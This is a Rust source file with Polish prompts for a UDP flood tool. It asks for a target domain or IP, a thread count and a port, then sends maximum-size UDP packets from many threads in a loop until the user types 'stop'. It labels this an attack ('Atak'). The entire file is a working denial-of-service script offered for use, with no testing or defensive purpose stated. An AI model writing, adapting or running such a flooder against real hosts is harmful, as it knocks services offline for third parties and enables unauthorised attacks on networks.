use std::net::{UdpSocket, SocketAddr};
use std::{thread, time};
use std::sync::{Arc, Mutex, atomic::{AtomicBool, Ordering}};
use std::io::{self, Write};
use std::net::ToSocketAddrs;

fn main() {
    let mut target = String::new();
    let mut num_threads_input = String::new();
    let mut port_input = String::new();

    println!("Podaj domenę lub IP: ");
    io::stdout().flush().unwrap();
    io::stdin().read_line(&mut target).unwrap();
    let target = target.trim();

    println!("Podaj liczbę wątków: ");
    io::stdout().flush().unwrap();
    io::stdin().read_line(&mut num_threads_input).unwrap();
    let num_threads: usize = match num_threads_input.trim().parse() {
        Ok(num) => num,
        Err(_) => {
            eprintln!("Błąd: Podano nieprawidłową liczbę wątków. Leci 500 i huj.");
            500
        }
    };

    print!("Podaj port: ");
    io::stdout().flush().unwrap();
    io::stdin().read_line(&mut port_input).unwrap();
    let port: u16 = match port_input.trim().parse() {
        Ok(p) => p,
        Err(_) => {
            eprintln!("Nieprawidłowy port. Leci na 80.");
            80
        }
    };

    let address = if target.contains(':') {
        target.to_string()
    } else {
        format!("{}:{}", target, port)
    };

    let addr = match address.to_socket_addrs() {
        Ok(mut addrs) => addrs.next().expect("Brak adresów."),
        Err(_) => {
            eprintln!("Nie ma takiego adresu.");
            return;
        }
    };

    println!("Adres docelowy: {}", addr);
    run_attack(addr, num_threads);
}

fn run_attack(addr: SocketAddr, num_threads: usize) {
    
    let socket = Arc::new(Mutex::new(
        UdpSocket::bind("0.0.0.0:0").expect("Nie udało się utworzyć gniazda"),
    ));

    let running = Arc::new(AtomicBool::new(true));

    let running_clone = Arc::clone(&running);
    thread::spawn(move || {
        let mut input = String::new();
        loop {
            input.clear();
            io::stdin().read_line(&mut input).unwrap();
            if input.trim().eq_ignore_ascii_case("stop") {
                running_clone.store(false, Ordering::Relaxed);
                break;
            }
        }
    });

    for _ in 0..num_threads {
        let running_clone = Arc::clone(&running);
        let socket_clone = Arc::clone(&socket);

        thread::spawn(move || {
            let data = vec![0u8; 65507];

            while running_clone.load(Ordering::Relaxed) {
                let socket = socket_clone.lock().unwrap();
                if let Err(e) = socket.send_to(&data, &addr) {
                    eprintln!("Błąd wysyłania: {}", e);
                }
            }
        });
    }

    loop {
        thread::sleep(time::Duration::from_secs(1));
        if !running.load(Ordering::Relaxed) {
            println!("Atak został zatrzymany.");
            break;
        }
    }
}
